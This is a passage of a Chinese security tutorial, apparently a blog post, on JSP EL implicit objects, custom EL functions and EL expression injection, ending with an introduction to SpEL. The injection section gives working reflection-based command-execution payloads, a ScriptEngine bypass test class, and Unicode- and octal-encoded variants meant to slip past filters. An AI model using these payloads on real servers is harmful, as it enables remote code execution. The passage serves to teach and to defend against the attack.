+<li><p><strong><code>pageScope</code></strong>：用于访问Page Scope中的变量。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageScope.myVariable&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>requestScope</code></strong>：用于访问Request Scope中的变量。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;requestScope.myVariable&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>sessionScope</code></strong>：用于访问Session Scope中的变量。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sessionScope.myVariable&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>applicationScope</code></strong>：用于访问Application Scope中的变量。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;applicationScope.myVariable&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="2-请求相关的隐式对象"><a href="#2-请求相关的隐式对象" class="headerlink" title="2. 请求相关的隐式对象"></a>2. 请求相关的隐式对象</h3><ul>
+<li><p><strong><code>param</code></strong>：用于访问请求参数的单个值。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;param.username&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>paramValues</code></strong>：用于访问请求参数的所有值（适用于多值参数）。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;paramValues.hobbies[<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>header</code></strong>：用于访问请求头的单个值。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;header[<span class="string">&#x27;User-Agent&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>headerValues</code></strong>：用于访问请求头的所有值（适用于多值头）。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;headerValues[<span class="string">&#x27;Accept-Language&#x27;</span>][<span class="number">0</span>]&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="3-其他隐式对象"><a href="#3-其他隐式对象" class="headerlink" title="3. 其他隐式对象"></a>3. 其他隐式对象</h3><ul>
+<li><p><strong><code>initParam</code></strong>：用于访问Web应用程序的初始化参数。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;initParam.myInitParam&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>cookie</code></strong>：用于访问请求中的cookie值。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;cookie.myCookie.value&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>pageContext</code></strong>：用于访问JSP页面的PageContext对象，提供了对其他隐式对象的访问。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.request.contextPath&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p>假设有一个表单提交，请求参数中包含<code>username</code>，可以在JSP页面中使用EL表达式来获取该参数的值：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Welcome, $&#123;param.username&#125;!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>$&#123;param.username&#125;</code>会自动获取请求参数<code>username</code>的值，并显示在页面上。</p>
+</li>
+</ol>
+<p>在EL（Expression Language）中，函数是一种可以被调用的代码单元，用于执行特定的操作或计算。EL函数通常与自定义标签库（Tag Library）一起使用，这些函数可以在JSP页面中通过特定的语法进行调用。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="定义EL函数"><a href="#定义EL函数" class="headerlink" title="定义EL函数"></a>定义EL函数</h4><p>EL函数通常在自定义标签库描述文件（Tag Library Descriptor, TLD）中定义。TLD文件是一个XML文件，用于描述标签库中的标签和函数。</p>
+<p>以下是一个简单的TLD文件示例（在 WEB-INF 文件夹下），定义了一个名为<code>toUpperCase</code>的EL函数：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">taglib</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/j2ee </span></span></span><br><span class="line"><span class="string"><span class="tag">        http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tlib-version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">tlib-version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">short-name</span>&gt;</span>MyFunctions<span class="tag">&lt;/<span class="name">short-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uri</span>&gt;</span>http://example.com/myfunctions<span class="tag">&lt;/<span class="name">uri</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">function</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>toUpperCase<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-class</span>&gt;</span>com.example.MyFunctions<span class="tag">&lt;/<span class="name">function-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">function-signature</span>&gt;</span>java.lang.String toUpperCase(java.lang.String)<span class="tag">&lt;/<span class="name">function-signature</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">function</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">taglib</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中：</p>
+<ul>
+<li><code>&lt;name&gt;</code>元素定义了函数的名称，这里是<code>toUpperCase</code>。</li>
+<li><code>&lt;function-class&gt;</code>元素指定了实现该函数的Java类的全限定名。</li>
+<li><code>&lt;function-signature&gt;</code>元素指定了函数的签名，包括返回类型和参数类型。</li>
+</ul>
+<h4 id="实现EL函数"><a href="#实现EL函数" class="headerlink" title="实现EL函数"></a>实现EL函数</h4><p>在Java类中实现EL函数，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFunctions</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toUpperCase</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> input.toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="在JSP中使用EL函数"><a href="#在JSP中使用EL函数" class="headerlink" title="在JSP中使用EL函数"></a>在JSP中使用EL函数</h4><p>在JSP页面中使用EL函数之前，需要先导入标签库。可以使用<code>&lt;%@ taglib %&gt;</code>指令来导入标签库：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;my&quot;</span> uri=<span class="string">&quot;http://example.com/myfunctions&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后，可以在JSP页面中使用EL表达式调用该函数：</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Uppercase: $&#123;my:toUpperCase(<span class="string">&quot;hello world&quot;</span>)&#125;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>$&#123;my:toUpperCase(&quot;hello world&quot;)&#125;</code>会调用<code>MyFunctions</code>类中的<code>toUpperCase</code>方法，并将结果显示在页面上。</p>
+<h3 id="禁用-启用EL表达式"><a href="#禁用-启用EL表达式" class="headerlink" title="禁用&#x2F;启用EL表达式"></a>禁用&#x2F;启用EL表达式</h3><h4 id="全局禁用EL表达式"><a href="#全局禁用EL表达式" class="headerlink" title="全局禁用EL表达式"></a>全局禁用EL表达式</h4><p>web.xml 中进入如下配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jsp-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>*.jsp<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-ignored</span>&gt;</span>true<span class="tag">&lt;/<span class="name">el-ignored</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jsp-property-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">jsp-config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="单个文件禁用EL表达式"><a href="#单个文件禁用EL表达式" class="headerlink" title="单个文件禁用EL表达式"></a>单个文件禁用EL表达式</h4><p>在JSP文件中可以有如下定义：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page isELIgnored=<span class="string">&quot;true&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该语句表示是否禁用EL表达式，TRUE 表示禁止，FALSE 表示不禁止。</p>
+<p>JSP2.0 中默认的启用EL表达式。</p>
+<h2 id="EL注入漏洞"><a href="#EL注入漏洞" class="headerlink" title="EL注入漏洞"></a>EL注入漏洞</h2><p>EL表达式注入漏洞和 SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。</p>
+<p>一般的，EL表达式注入漏洞的外部可控点入口都是在 Java 程序代码中，即 Java 程序中的EL表达式内容全部或部分是从外部获取的。</p>
+<h3 id="通用-PoC"><a href="#通用-PoC" class="headerlink" title="通用 PoC"></a>通用 PoC</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）</span></span><br><span class="line">$&#123;pageContext&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取Web路径</span></span><br><span class="line">$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文件头参数</span></span><br><span class="line">$&#123;header&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取webRoot</span></span><br><span class="line">$&#123;applicationScope&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">$&#123;pageContext.request.getSession().setAttribute(<span class="string">&quot;a&quot;</span>,pageContext.request.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>).exec(<span class="string">&quot;calc&quot;</span>).getInputStream())&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个payload是一个典型的Java表达式语言（EL）注入攻击的例子。它利用了Java的反射机制来执行系统命令。下面是对这个payload的详细分析：</p>
+<ol>
+<li><p><strong><code>$&#123;...&#125;</code></strong>: 这是Java表达式语言（EL）的语法，用于在JSP页面中动态求值。</p>
+</li>
+<li><p><strong><code>pageContext.setAttribute(&quot;a&quot;, ...)</code></strong>: 这行代码的目的是在<code>pageContext</code>对象上设置一个名为<code>a</code>的属性。这个属性的值是通过后面的表达式计算得出的。</p>
+</li>
+<li><p><strong><code>&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;)</code></strong>: 这部分代码通过空字符串<code>&quot;&quot;</code>获取<code>String</code>类的类对象，然后调用<code>forName</code>方法加载<code>java.lang.Runtime</code>类。<code>java.lang.Runtime</code>类提供了与运行时环境交互的方法。</p>
+</li>
+<li><p><strong><code>getMethod(&quot;exec&quot;, &quot;&quot;.getClass())</code></strong>: 这部分代码获取<code>java.lang.Runtime</code>类中的<code>exec</code>方法，该方法用于执行系统命令。<code>&quot;&quot;.getClass()</code>返回<code>String</code>类的类对象，作为<code>exec</code>方法的参数类型。</p>
+</li>
+<li><p><strong><code>invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc.exe&quot;)</code></strong>: 这部分代码执行以下步骤：</p>
+<ul>
+<li><strong><code>&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null)</code></strong>: 获取<code>java.lang.Runtime</code>类的<code>getRuntime</code>方法，并调用它以获取<code>Runtime</code>实例。<code>getRuntime</code>方法是静态的，所以<code>invoke(null)</code>调用它。</li>
+<li><strong><code>invoke(..., &quot;calc.exe&quot;)</code></strong>: 使用上一步获取的<code>Runtime</code>实例调用<code>exec</code>方法，并传入参数<code>&quot;calc.exe&quot;</code>。这实际上是在执行系统命令<code>calc.exe</code>，通常是启动Windows计算器应用程序。</li>
+</ul>
+</li>
+</ol>
+<p>总结来说，这个payload的目的是通过Java反射机制在服务器上执行系统命令<code>calc.exe</code>。</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="基础-EXP"><a href="#基础-EXP" class="headerlink" title="基础 EXP"></a>基础 EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-ScriptEngine-调用-JS-引擎绕过"><a href="#利用-ScriptEngine-调用-JS-引擎绕过" class="headerlink" title="利用 ScriptEngine 调用 JS 引擎绕过"></a>利用 ScriptEngine 调用 JS 引擎绕过</h3><p>导入依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.odysseus.juel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>juel-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.odysseus.juel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>juel-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>de.odysseus.juel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>juel-spi<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当然，以下是给你的代码添加注释的版本：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;</span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个表达式工厂实例，用于创建和解析表达式。</span></span><br><span class="line">        <span class="type">ExpressionFactory</span> <span class="variable">expressionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建一个简单的上下文实例，用于提供表达式计算的上下文环境。</span></span><br><span class="line">        <span class="type">SimpleContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleContext</span>();</span><br><span class="line">              	</span><br><span class="line">        <span class="comment">// failed</span></span><br><span class="line">        <span class="comment">// String exp = &quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;;</span></span><br><span class="line">        <span class="comment">// 定义一个表达式字符串，该表达式使用JavaScript引擎执行系统命令</span></span><br><span class="line">        <span class="comment">// ok</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用表达式工厂创建一个值表达式</span></span><br><span class="line">        <span class="type">ValueExpression</span> <span class="variable">valueExpression</span> <span class="operator">=</span> expressionFactory.createValueExpression(simpleContext, exp, String.class);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 计算并获取表达式的值，并打印结果</span></span><br><span class="line">        System.out.println(valueExpression.getValue(simpleContext));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC解释"><a href="#POC解释" class="headerlink" title="POC解释"></a>POC解释</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这一段代码是一个Java表达式语言（EL）字符串，它利用了Java的脚本引擎来执行系统命令。以下是对这段代码的详细解释：</p>
+<ol>
+<li><p><strong><code>$&#123;&#125;</code></strong>：这是Java表达式语言（EL）的语法，用于在字符串中嵌入表达式，并计算表达式的值。</p>
+</li>
+<li><p><strong><code>&#39;&#39;.getClass()</code></strong>：这是一个空字符串（<code>&#39;&#39;</code>）调用 <code>getClass()</code> 方法，返回 <code>String</code> 类的 <code>Class</code> 对象。这里使用空字符串只是为了获取 <code>Class</code> 对象，实际上任何对象都可以用来调用 <code>getClass()</code>。</p>
+</li>
+<li><p><strong><code>.forName(&quot;javax.script.ScriptEngineManager&quot;)</code></strong>：调用 <code>Class</code> 对象的 <code>forName</code> 方法，加载 <code>javax.script.ScriptEngineManager</code> 类。这个类是Java脚本API的一部分，用于管理脚本引擎。</p>
+</li>
+<li><p><strong><code>.newInstance()</code></strong>：调用 <code>ScriptEngineManager</code> 类的 <code>newInstance</code> 方法，创建一个新的 <code>ScriptEngineManager</code> 实例。</p>
+</li>
+<li><p><strong><code>.getEngineByName(&quot;JavaScript&quot;)</code></strong>：调用 <code>ScriptEngineManager</code> 实例的 <code>getEngineByName</code> 方法，获取名为 “JavaScript” 的脚本引擎。Java支持多种脚本语言，这里指定使用JavaScript引擎。</p>
+</li>
+<li><p><strong><code>.eval(&quot;java.lang.Runtime.getRuntime().exec(&#39;Calc.exe&#39;)&quot;)</code></strong>：调用JavaScript引擎的 <code>eval</code> 方法，执行一段JavaScript代码。这段JavaScript代码调用了Java的 <code>Runtime</code> 类的 <code>exec</code> 方法，执行系统命令 <code>Calc.exe</code>。</p>
+</li>
+</ol>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这段代码的目的是通过Java的脚本引擎执行系统命令 <code>Calc.exe</code>。虽然这段代码在技术上是可行的，但它展示了如何通过Java表达式语言执行任意系统命令，这在实际应用中是非常危险的，因为它可能导致安全漏洞。在生产环境中，应严格限制和审查表达式的内容，避免执行任意系统命令。</p>
+<h3 id="利用-Unicode-编码绕过"><a href="#利用-Unicode-编码绕过" class="headerlink" title="利用 Unicode 编码绕过"></a>利用 Unicode 编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Unicode编码内容为前面反射调用的PoC</span><br><span class="line">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用八进制编码绕过"><a href="#利用八进制编码绕过" class="headerlink" title="利用八进制编码绕过"></a>利用八进制编码绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 八进制编码内容为前面反射调用的PoC</span><br><span class="line">\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175</span><br></pre></td></tr></table></figure>
+
+<h1 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Spring Expression Language（SPEL）是一种功能强大的表达式语言，用于在运行时查询和操作对象图。它是Spring框架的一部分，旨在提供一种简洁而灵活的方式来处理复杂的表达式求值。</p>
+<p>SPEL的主要特点包括：</p>
+<ol>
+<li><strong>灵活性</strong>：支持字面量、属性、方法、数组、列表、内联列表、内联数组、三元运算符、正则表达式等多种表达式。</li>
+<li><strong>类型支持</strong>：允许访问类静态方法和常量。</li>
+<li><strong>集合操作</strong>：支持对集合进行过滤、投影等操作。</li>
+<li><strong>模板表达式</strong>：允许混合字面量和表达式，使得配置更加灵活。</li>
+</ol>
+<p>SPEL的应用场景包括：</p>
+<ul>
+<li><strong>Spring配置文件</strong>：在XML或注解配置中使用SPEL进行动态配置。</li>
+<li><strong>Spring Security</strong>：用于定义安全规则和权限检查。</li>
+<li><strong>Spring Data</strong>：在查询和条件表达式中使用SPEL。</li>
+</ul>
+<p>通过SPEL，开发者可以编写简洁而强大的表达式，从而在运行时动态地处理数据和逻辑。</p>
